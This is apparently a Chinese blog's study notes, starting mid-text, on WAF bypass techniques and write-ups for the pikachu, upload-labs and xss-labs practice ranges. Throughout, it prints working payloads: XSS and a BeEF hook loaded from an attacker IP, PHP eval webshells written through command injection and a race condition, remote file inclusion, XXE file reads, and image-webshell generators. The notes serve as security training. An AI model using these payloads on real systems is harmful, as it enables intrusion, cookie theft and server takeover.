text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Connection: close HTTP charset利用Content-Type: xxx;charset=xxx编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果 123application/x-www-form-urlencoded; charset=ibm037multipart/form-data; charset=ibm037, boundary=blahmultipart/form-data; boundary=blah ; charset=ibm037 WAF特性云WAF绕过找到真实IP，修改本地hosts文件或者直接在burp中指定解析，避免流量走到云WAF上即可。 白名单绕过一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。 如：WAF设立了白名单/admin，那么我们的测试payload可以通过如下的手法来绕过 1234# 原来被拦截http://a.a/?id=123 and 2*3=6# 现在不拦截http://a.a/?a=/admin&amp;id=123 and 2*3=6 静态文件绕过一些WAF为了减少服务器的压力，会对静态文件如.png、.css等直接放行，那么我们可以尝试伪装成静态文件来绕过 如： 1234# 原来被拦截http://a.a/?id=123 and 2*3=6# 现在不拦截http://a.a/?1.jpg&amp;id=123 and 2*3=6 Content-Type绕过一些WAF识别到特定的content-type后，则会判定为该请求的类型，如： 发现Content-Type为multipart/form-data时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload 请求方式绕过 一些WAF对于get请求和post请求的处理机制不一样，可能对POST请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。 一些WAF检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。 解析兼容性一些WAF检测时，完全按照标准的HTTP协议去匹配，但WEB容器会做一些兼容性适配，如上传时 1filename=&quot;shell.php&quot; 我们只需要稍加修改，那么按照标准协议去解析就找不到文件名，从而绕过拦截 123filename=&quot;shell.phpfilename='shell.php'filename=shell.php 容器特性 Tip 可通过所有fuzz一遍，看看容器是如何处理的 IIS+ASP： %会被自动去掉 unicode会自动解码 1&lt;script&gt; == &lt;%s%cr%u0131pt&gt; tomcat: 路径穿越 1/path1/path2/ == ;/path1;foo/path2;bar/;","link":"/2025/12/18/%E9%80%9A%E7%94%A8%E7%BB%95waf/"},{"title":"","text":"pikachu+xss+ssti-labs汇总 pikachu靶场XSS反射型GET危害前端用户窃取cookie 1sudo beef-xss http://127.0.0.1:3000/ui/panelbeef2005 1http://&lt;IP&gt;:3000/hook.js 反射型(get)1?message=&lt;script src=&quot;http://172.27.245.57:3000/hook.js&quot;&gt;&lt;/script&gt;&amp;submit=submit 播放音频 在kali桌面监听 1python3 -m http.server 8000 然后去访问 1http://172.27.245.57:8000/misc.wav 就成功播放了音乐 反射型POST1&lt;script&gt;alert(1)&lt;/script&gt; 存储型执行后一直会弹窗 1&lt;script&gt;alert('test')&lt;/script&gt; dom型拼接 1234567&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;'&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=''&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;'onclick=&quot;alert('xss')&quot;&gt;&lt;a href=''onclick=&quot;alert('xss')&quot;&gt;'&gt;what do you see?&lt;/a&gt; dom型xss-x1234567&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;'&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=''&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;'onclick=&quot;alert('xss')&quot;&gt;&lt;a href=''onclick=&quot;alert('xss')&quot;&gt;'&gt;what do you see?&lt;/a&gt; 多点一部 xss盲打依旧xss-beef 1&lt;script src=&quot;http://172.27.245.57:3000/hook.js&quot;&gt;&lt;/script&gt; 拿到管理员cookie就可以用管理员登陆 xss过滤就是过滤了script直接 1&lt;img src=&quot;onerror='alert(1)'/&gt;' xss-htmlspecialchars htmlspecialchars在php8版本前是不会对’做转义的 1'onclick='alert(1)' xss之href输出 1'onclick='alert(1)' 、单引号杯转义了 1javascript:alert(1) xss之js输出直接闭合注释后面的 1';alert(1)// RCEpinglinux 1127.0.0.1;echo '&lt;?php @eval($_POST['attack']);?&gt;' &gt; 1.php windows 12127.0.0.1 &amp; dir127.0.0.1 &amp; echo &quot;&lt;?php @eval($_POST['attack']);?&gt;&quot; &gt; 1.php eval1system('echo '&lt;?php @eval($_POST['attack']);?&gt;' &gt; 1.php'); 文件包含本地文件包含 可以文件包含读文件 1file:///etc/passwd 远程文件包含1?filename=115.190.102.32:8000/1.txt 用.txt后缀访问即可 123&lt;?php file_put_contents(&quot;shell2.php&quot;, 'eval($_POST[&quot;1&quot;]);');?&gt; 文件上传client type写一个webshell正常图片抓包改php就成功上传了 MIME类型修改Content-Type:为以下内容任意 1234567image/apngimage/avifimage/gifimage/jpegimage/pngimage/svg+xmlimage/webp getimagesize函数要求是有效的图像文件 将文件的后缀改png并不能绕真图像里面附带信息 1copy 1cc.png /b +she.php /a shell.png 上传shell.png就直接上传成功了 绝对路径文件包含拼接图片(绝对路径) 1?filename=../../../../var/www/html/vul/unsafeupload/uploads/2025/12/12/371470693b111177b45306121694.png 越权漏洞水平越权lucy/123456,lili/123456,kobe/123456 访问其他用户信息 垂直越权这里有两个用户admin/123456,pikachu/000000,admin是超级boss 简单来说就是以普通用户访问管理员管理页面url可以直接修改 xxe什么是XML?用来传输数值读取本地文件 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; CTRL+U ：URL加密 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; 探测内网存活端口 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;http://127.0.0.1:80&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; 爆破80这里，就可以看内网哪些端口开了 反序列化 1234567891011&lt;?php class Person { var $name; var $height; } $zhangsan=new Person(); $zhangsan-&gt;name='张三'; //var_dump($zhangsan); echo serialize($zhangsan); 1234567891011121314&lt;?php class Person { var $name; var $height; } $zhangsan=new Person(); $zhangsan-&gt;name='张三'; //var_dump($zhangsan); $zhangsan-&gt;height=20; echo serialize($zhangsan);O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:6:&quot;height&quot;;i:20;} 反序列化函数 123456789&lt;?php class Person { var $name; var $height; }$s='O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:6:&quot;height&quot;;i:20;}';un 导致问题是因为一些魔法函数 construct创建destruct销毁,运行结束就销毁tostring当作字符串sleep 12345678910111213&lt;?php class s { var $test = &quot;pikachu&quot;; function __destruct() { echo $this-&gt;test; } } $s = new s(); $s-&gt;test = &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;; echo serialize($s); ?&gt; CSRFget跨站请求伪造vince/allen/kobe/grady/kevin/lucy/lili,密码全部是123456修改个人信息 uploads-labsless-1前端js校验 复制下面的代码 1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; }} 然后改加一个允许php,在终端跑一下就可以了 1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif|.php&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; }} 然后就可以上传了 方法二： less-2 less-3这次使用了黑名单后端过滤 并且还会对上传的文件重命名 尝试其他php后缀 123456789.php3.php4.php5.php7.phps.php-s.pht.phar.phtml 上传php5成功在源代码看到上传路劲 蚁剑返回为空说明未被解析成功不解析说明在appache的httpd.conf里面没有下面这一行 1AddType application/x-httpd-php .php .php3 .php5 .phtml 我们这里如果不是本地的靶场就无法去修改这个文件 然后就可以了 less-4本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ 123456789101112创建.htaccess文件，代码如下：方法一：&lt;FilesMatch &quot;4.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;#如果当前目录下有4.png，就会被解析为.php 方法二：AddType application/x-httpd-php .png#如果当前目录下有以.png结尾的文件，就会被解析为.php less-5 而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的php.ini，可以利用这个文件来构造后门和隐藏后门。.user.ini使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。 12345.user.ini 配置项中有两个配置可以起到一些作用方法一：auto_prepend_file = &lt;filename&gt; //包含在文件头方法二：auto_append_file = &lt;filename&gt; //包含在文件尾 less-6文件大小写过滤不严谨 123大小写绕过原理：Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。Linux系统下，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。 less-7123456array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 发现没有对上传的文件名做去空格的操作-&gt;trim()利用burp抓包，修改对应的文件名 添加空格。Windows系统下，对文件名中空格会被作为空处理，程序中的检测代码却不能自动删除空格。从而绕过黑名单. less-8(windows环境)123456$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);$file_name = trim($_FILES['upload_file']['name']);$file_ext = strrchr($file_name, '.');$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空 Windows 系统（NTFS/FAT32/ExFAT 等主流文件系统）的文件命名规范 中，存在一个关键设计：不允许文件名 / 文件后缀的末尾以英文句点（.）结尾，当系统处理以.结尾的文件名时，会自动截断末尾的所有句点（包括单个 / 多个末尾点）。 然后去掉.发现对上传的文件后缀名未做去点.的操作—&gt;strrchr($file_name, '.')Windows系统下，文件后缀名最后一个点会被自动去除。上传 8.php. less-9(Windows环境)Windows文件上传::$DATA绕过上传NTFS数据流DATA流类型a.php::$DATA 黑名单没有包含 到Windows上传成功后会自动删除::$DATA less-10（Windows环境操作）12345678$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 #将文件名进行过滤操作后，将文件名拼接在路径后面，所以需要绕过前面的首尾去空以及去点。 上传文件名为 .php. .(点+php+点+空格+点) trim()：仅删除字符串首尾的半角空格（U+0020）、\\t、\\n、\\r，不处理点、中间空格；deldot()（常规实现）：仅循环删除文件名末尾的点（.），直到最后一个字符不是点为止；strrchr($str, '.')：找字符串中「最后一个 .」，返回该点到字符串末尾的所有内容；Windows 文件系统：强制规范化文件名 → 先删末尾所有空格 → 再删末尾所有点 less-1112345678代码分析： $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);#将这些扩展名从文件名中移除 $temp_file = $_FILES['upload_file']['tmp_name']; 利用str_ireplace()将文件名中符合黑名单的字符串替换成空利用方式：利用双写黑名单字符，对字符串的一次过滤后拼接出php,文件名`.pphphp` str_ireplace函数的问题直接 12.pphphp会匹配php删除掉 less-12前提需要php的版本号低于5.3.29，且magic_quotes_gpc为关闭状态（需要自己关闭）去php.ini修改 1magic_quotes_gpc = Off 上传图片分析数据包，使用白名单限制上传文件类型，但上传文件的存放路径可控利用方法：设置上传路径为upload/12.php%00 ,添加12.php%00内容为了控制路径，上传文件后缀为白名单即可 例:12.png，保存后为/upload/12.php%00*****.png，但服务端读取到%00时会自动结束，将文件内容保存至12.php中 1234567891011121314代码分析：if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].&quot;/&quot;.ra![](https://cdn.nlark.com/yuque/0/2025/png/62156892/1765972093905-116673fb-9be6-43f0-97f5-8b9fdb5a21e5.png)nd(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;知识补充：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。strrpos(string,find[,start]) 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。substr(string,start[,length])函数返回字符串的一部分(从start开始 [，长度为length])magic_quotes_gpc 着重偏向数据库方面，是为了防止sql注入，但magic_quotes_gpc开启还会对$_REQUEST, $_GET,$_POST,$_COOKIE 输入的内容进行过滤 less-1312第13题与12题思路一样使用白名单限制上传文件类型，但上传文件的存放路径可控，但因为是POST型，需要对%00进行解码或在16进制中修改，POST不会像GET那样对%00进行自动解码。 less-14本关会读取判断上传文件的前两个字节，判断上传文件类型，并且后端会根据判断得到的文件类型重命名上传文件使用 图片马 + 文件包含 绕过 123456789补充：Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNGJpg图片文件包括2字节：FF D8。Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。Bmp图片文件包括2字节：42 4D。即为 BM 图片马制作：在cmd里执行 **copy logo.jpg/b+test.php/a test.jpg**#logo.jpg为任意图片；test.php 插入的木马文件；test.jpg 生成的图片木马 上传完复制文件路径，点击上图黄色的文件包含漏洞 分析代码可以知道get传参，参数是file，构造如下图参数 less-15查看提示： 本pass使用getimagesize()检查是否为图片文件！ 12getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。主要是针对*.php直接更改文件后缀为图片后缀，上一题创建的图片马仍然可以使用。 方法同Pass-14 less-16（需要开启php_exif模块）12exif_imagetype()读取一个图像的第一个字节并检查其后缀名。返回值与getimage()函数返回的索引2相同，但是速度比getimage快 方法同Pass-14 构造一个gif马 less-17二次渲染 1234上传→验证→渲染重生成→删除原文件→保存新文件1. **后缀 + Content-Type 校验可伪造**：`$fileext`（后缀）和`$filetype`（Content-Type）都是前端 / 请求头可控的，攻击者可轻易将 PHP 文件伪装为`1.jpg`，并伪造 Content-Type 为`image/jpeg`；2. **GD 库验证仅 “识别图片”，不 “清理代码”**：`imagecreatefromjpeg/png/gif`的作用是 “判断文件是否为合法图片格式”（只要 GD 库能解析出图片像素，就返回非 false），但它**不会检查 / 删除图片中嵌入的非图片数据（如 PHP 代码）**；3. **二次渲染仅 “重绘图片”，不 “清空文件”**：新生成的图片文件（如`rand().jpg`）会保留上述 “安全区域” 的 PHP 代码 —— 因为 GD 库只重绘像素数据，不会修改注释、EOI 后等非像素区域的内容。 传less-16的码子不行 upload-labs之pass 16详细分析-先知社区 加在相同的地方后面 1include.php/?file=upload/4520251216222228.gif 脚本后面再研究研究 12345678910111213141516171819202122232425262728293031&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,'1.png'); //要修改的图片的路径 /* 木马内容&lt;?$_GET[0]($_POST[1]);?&gt; *///imagepng($img,'1.png'); 要修改的图片的路径,1.png是使用的文件，可以不存在//会在目录下自动创建一个1.png图片//图片脚本内容：$_GET[0]($_POST[1]);//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php?&gt; less-1812345678910111213141516171819202122$is_upload = false; $msg = null; if(isset($_POST['submit'])){ // 检查是否提交了上传表单，如果提交了则执行下面的代码块 $ext_arr = array('jpg','png','gif'); // 定义允许上传的文件类型数组，包括jpg，png，gif $file_name = $_FILES['upload_file']['name']; // 从上传表单中获取上传文件的名字 $temp_file = $_FILES['upload_file']['tmp_name']; // 从上传表单中获取上传文件的临时路径 $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); // 获取上传文件的扩展名，即文件名的最后部分 $upload_file = UPLOAD_PATH . '/' . $file_name; // 拼接出上传文件的完整路径，创建以原文件名为名的文件 if(move_uploaded_file($temp_file, $upload_file)){ // 将临时文件移动到指定的路径，如果移动成功则执行 if(in_array($file_ext,$ext_arr)){ // 检查上传文件的扩展名是否在允许的类型数组中，如果在则执行下面的代码块 $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; #生成新的文件名，包括随机数字、当前日期和时间以及原文件的扩展名 rename($upload_file, $img_path); // 将上传的文件重命名为新的文件名 $is_upload = true; }else{ // 如果上传文件的扩展名不在允许的类型数组中，则设置错误消息，并删除上传的文件 $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = '上传出错！'; } } 将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可通过条件竞争的方式在unlink之前，访问webshell。直接BurpSuite上爆破，或者写脚本都一样的 123&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[&quot;cmd&quot;]) ?&gt;');?&gt; 爆破访问马子路径，利用正在访问的文件不会被删掉的性质 算了BurpSuite爆破的话是要你一直去访问那个马才不会被删掉，有点蠢了，写脚本好些 条件竞争的骚操作(一)-先知社区 less-19同样存在条件竞争 通过分析源代码发现后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，然后再不断通过include.php不断包含上传的文件（注意上传后的文件名：uploadxxx.jpg）从而从而生成木马。 区别于Pass-18,这里需要使用上一题的php代码生成图片马测试发现重命名后的图片马依旧可以被文件包含，从而生成shell.php 123&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[&quot;cmd&quot;]) ?&gt;');?&gt; less-20Linux环境Windows环境下使用/.绕过， 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 分析代码可知：没有对上传的文件做判断，只对用户输入的文件名做判断，后缀名黑名单上传的文件名用户可控，黑名单用于用户输入的文件后缀名进行判断 1move_uploaded_file()会忽略掉文件末尾的 /.，主要作用是将临时文件移到指定的目标路径，并确保文件在移动中不会被删除或覆盖。 这里Windows不要用%00直接用/.就可以绕过···· less-21123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = &quot;禁止上传该类型文件!&quot;; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = &quot;禁止上传该后缀文件!&quot;; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = &quot;文件上传成功！&quot;; $is_upload = true; } else { $msg = &quot;文件上传失败！&quot;; } } }}else{ $msg = &quot;请选择要上传的文件！&quot;;} 检查MIME(修改content-type)判断POST参数save_name是否为空判断$file最后一个元素是否为数组 上传后文件名qwe.php put方法漏洞上传webshellput上传文件 HTTP1.0定义了三种请求方法：GET,POST和HEAD方法。HTTP1.1新增了五种请求方法：OPTIONS,PUT,DELETE,TRACE和CONNECT方法。HTTP九种请求方法的功能用途与特性详解-开发者社区-阿里云 如果服务器存在a.php上传a.php就会替换掉把 123telent ip 端口OPTIONS / HTTP/1.1HOST: IP 查看开放 1nikto -h 网站 b站 w啥都学 XSSlabs基础xss，跨站脚本攻击 嵌入网页，主要攻击客户端 用户名信息键盘详细cookie密码 1.request2.回index.html,index.php 读取客户想要访问的页面3.浏览器解析执行html展示页面效果 response 攻击代码一般是前端js代码浏览器解析攻击代码1.获取用户名密码2.发送给hacker3.基于你的身份登录，系统如果是后台管理员系统，为所欲为 前端Javascript，VBscript XSS分类反射型，Dom型，存储型 有输入输出的地方都可以尝试XSS，有输出可以做xss 存储型： 发送一段js代码，服务器保存到数据库里面了，一般在留言板，评论区，注册等页面，存储型反射型： 发了什么，然后服务器直接返回到客户端了，一次性 ，一般在查询类页面，这叫反射型DOM型，又有反射，又有存储 输入jaden 直接返回jaden 点下面这个直接找到input标签的代码 这个input做了长度限制修改 1&lt;script&gt;alert(123);&lt;/script&gt; 出现弹框窗口，执行成功 存储型执行，点击其他去页面返回仍然会显示 DOMDOM全称是DocumentObjectModel，也就是文档对象模型 ==通过js代码操作文档对象模型触发的漏洞 1xxx' onclick=&quot;alert('xss')&quot;&gt; dom型xss-x 源代码 12345678910 function domxss(){ var str = window.location.search; var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]); var xss = txss.replace(/\\+/g,' ');// alert(xss); document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href='&quot;+xss+&quot;'&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;; } //试试：'&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert('xss')&quot;&gt; //试试：' onclick=&quot;alert('xss')&quot;&gt;,闭合掉就行 1'onclick=&quot;alert('xss')&quot; 可能触发DOM型XSS的js操作： 